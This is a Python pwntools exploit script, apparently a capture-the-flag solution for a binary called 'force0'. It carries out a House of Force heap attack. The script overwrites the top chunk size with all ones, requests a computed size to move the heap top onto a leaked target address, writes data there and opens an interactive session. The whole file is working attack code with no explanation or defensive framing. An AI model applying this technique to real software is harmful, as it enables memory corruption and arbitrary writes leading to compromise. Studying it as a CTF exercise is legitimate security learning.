#!/usr/bin/python3

from pwn import *

exe = ELF("./force0_patched")
libc = ELF("./libc.so.6")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b *main+103
        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

p.recvuntil(b'Heap address @')
heap_base = int(p.recvline(), 16)
log.info("Heap base : " + hex(heap_base))
p.recvuntil(b'Target address @')
target_address = int(p.recvline(), 16)
log.info("Target address : " + hex(target_address))

evil_size = (target_address - (heap_base + 0x1a0) - 0x20)
log.info("Evil size : " + hex(evil_size))

sla(b'> ', b'1')
sna(b'Size: ', 400)
sa(b'Data: ', b'a'*408 + p64(0xffffffffffffffff))

sla(b'> ', b'1')
sna(b'Size: ', evil_size)
sa(b'Data: ', b'a')

sla(b'> ', b'1')
sla(b'> ', b'1')
sna(b'Size: ', 40)
sa(b'Data: ', b'I DID!\0')
p.interactive()

